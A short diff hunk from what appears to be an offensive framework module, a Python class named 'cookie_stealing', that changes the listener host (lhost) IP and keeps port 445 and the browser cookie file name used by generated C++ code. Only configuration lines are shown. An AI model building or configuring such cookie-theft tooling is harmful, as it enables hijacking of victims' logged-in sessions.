@@ -29,7 +29,7 @@ class cookie_stealing(Module):
 
 		#ARGUMENTOS DEL CODIGO CPP
 
-		lhost = "10.10.1.13"
+		lhost = "192.168.114.129"
 		lport = 445
 		nombre_archivo_cookies = "Cookies"
 
